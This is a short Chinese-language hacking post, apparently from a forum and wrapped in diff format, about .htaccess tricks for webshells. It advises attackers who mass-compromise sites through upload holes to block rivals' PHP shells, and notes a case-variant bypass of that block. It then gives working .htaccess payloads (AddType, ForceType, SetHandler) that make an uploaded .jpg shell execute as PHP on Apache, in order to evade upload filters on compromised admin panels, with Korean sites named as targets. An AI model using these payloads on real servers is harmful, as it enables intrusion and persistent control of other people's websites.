@@ -1,0 +1,35 @@
+经常会有人批量拿shell。特别是upload shell这样的漏洞。
+
+拿下之后最简单的修补方法是，上传一个.
+
+.HTACCESS文件到该木马，先把你的马儿转移到别的目标。
+
+.HTACCESS内容
+
+<FilesMatch "\.(php|php3|php4|php5|php6|php2)">
+ 
+Deny from all
+ 
+</FilesMatch>
+当然这是不完善的，经过我测试，Php即可轻松绕过，你们自行添加吧。
+
+那么别人传的马儿自然无法执行了。
+
+逆向思维一下，当我们拿到一个后台权限，上传PHPshell，可恨的是，他会自动把PHP这个关键词改成PHP-，
+
+加一个横杠，有木有，特别是韩国站比较多见。
+
+如果你运气不是那么背，环境是apache的，并且支持.HTACCESS，那么，恭喜你
+
+上传一个.HTACCESS，内容是
+
+AddType   application/x-httpd-php     .jpg
+然后再传一个JPG结尾的shell，访问即可执行了
+
+有点小儿科，刚刚用到，顺手发上来了.
+
+<Files demo.jpg>
+ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+</Files>
+这种只有是指定文件名的文件，才能被当做PHP解析.
